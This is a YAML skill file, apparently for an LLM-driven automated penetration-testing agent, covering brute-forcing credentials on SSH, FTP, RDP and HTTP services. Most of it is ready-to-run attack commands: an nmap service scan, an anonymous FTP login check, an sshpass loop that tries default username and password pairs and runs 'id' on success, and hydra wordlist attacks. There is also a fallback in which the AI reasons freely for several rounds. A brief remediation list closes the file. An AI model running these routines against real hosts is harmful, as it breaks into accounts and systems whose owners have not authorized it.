skill_id: credential_bruteforce
name: "凭据暴力破解 (SSH/FTP/RDP/HTTP)"
category: credential
phase: foothold
version: "1.0"

principle: |
  当目标开放 SSH/FTP/RDP/HTTP 认证服务但无已知 CVE 时，
  尝试默认凭据和常见弱口令。工具链: hydra → medusa → ncrack。
  优先测试默认凭据（admin:admin, root:root 等），再小字典爆破。

match:
  rules:
    - service_is: "ssh"
      port_is: [22, 2222, 2211]
    - service_is: "ftp"
      port_is: [21]
    - service_is: "rdp"
      port_is: [3389]
    - evidence_contains: ["弱口令"]
    - evidence_contains: ["weak password"]
    - evidence_contains: ["default credential"]
    - fingerprint_contains: ["login"]
      evidence_contains: ["http-auth"]

probes:
  - id: detect_services
    description: "检测目标认证服务类型"
    # 门禁：若 LFI 已确认（lfi_confirmed / lfi_depth 被前置 skill 记住），
    # 则跳过凭据爆破，让日志投毒链先走（见 REACT_SYSTEM 硬优先级 A 状态）
    skip_if:
      lfi_confirmed: true
    command: |
      echo "=== Service Detection ==="
      nmap -sT -sV -p 21,22,2222,3389,80,443,8080 --open {TARGET_IP} 2>/dev/null | grep "open"
      echo "PROBE_DONE"
    timeout: 30
    parse_rules:
      - if_contains: ["ssh"]
        set: { has_ssh: true }
      - if_contains: ["ftp"]
        set: { has_ftp: true }
      - if_contains: ["3389/tcp"]
        set: { has_rdp: true }

  - id: check_ftp_anon
    description: "检测 FTP 匿名登录"
    depends_on: { has_ftp: true }
    command: |
      echo "=== FTP Anonymous Check ==="
      result=$(curl -s --max-time 10 "ftp://anonymous:anonymous@{TARGET_IP}/" 2>&1)
      if echo "$result" | grep -qiE "drwx|total|index|ftp>"; then
        echo "FTP_ANON_OK"
        echo "$result" | head -20
      else
        echo "FTP_ANON_FAILED"
      fi
    timeout: 15
    parse_rules:
      - if_contains: ["FTP_ANON_OK"]
        set: { ftp_anon: true }

exploit_paths:
  - path_id: ssh_default_creds
    name: "SSH 默认凭据测试"
    priority: 1
    conditions:
      has_ssh: true
    # 门禁：若 LFI 已确认，应走日志投毒链，不应启动 SSH 爆破
    skip_if:
      lfi_confirmed: true
    steps:
      - id: ssh_hydra
        description: "hydra SSH 默认凭据 + 小字典"
        command: |
          echo "=== SSH Credential Test ==="
          # 先测试常见默认凭据
          for cred in root:root root:toor admin:admin admin:123456 \
                      root:password root:123456 test:test guest:guest \
                      ubuntu:ubuntu vagrant:vagrant; do
            u=$(echo "$cred" | cut -d: -f1)
            p=$(echo "$cred" | cut -d: -f2)
            result=$(sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                     "$u@{TARGET_IP}" -p {TARGET_PORT} "id" 2>&1)
            if echo "$result" | grep -q "uid="; then
              echo "SSH_CRED_FOUND:$u:$p"
              echo "$result"
              exit 0
            fi
          done
          # hydra 小字典
          hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
                -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
                -t 4 -f ssh://{TARGET_IP}:{TARGET_PORT} 2>&1 || true
        timeout: 120
        success_criteria:
          stdout_contains_any: ["SSH_CRED_FOUND", "login:", "[22]"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "ssh_login"

  - path_id: ftp_default_creds
    name: "FTP 凭据测试"
    priority: 2
    conditions:
      has_ftp: true
    skip_if:
      ftp_anon: true
    steps:
      - id: ftp_hydra
        description: "hydra FTP 默认凭据"
        command: |
          echo "=== FTP Credential Test ==="
          hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
                -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
                -t 4 -f ftp://{TARGET_IP} 2>&1 || true
        timeout: 90
        success_criteria:
          stdout_contains_any: ["login:", "[21]"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "ftp_login"

  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5

remediation: |
  1. 禁用默认凭据，强制使用强密码策略
  2. 启用账户锁定机制（fail2ban 等）
  3. 使用 SSH 密钥认证替代密码
  4. 限制认证服务的访问 IP
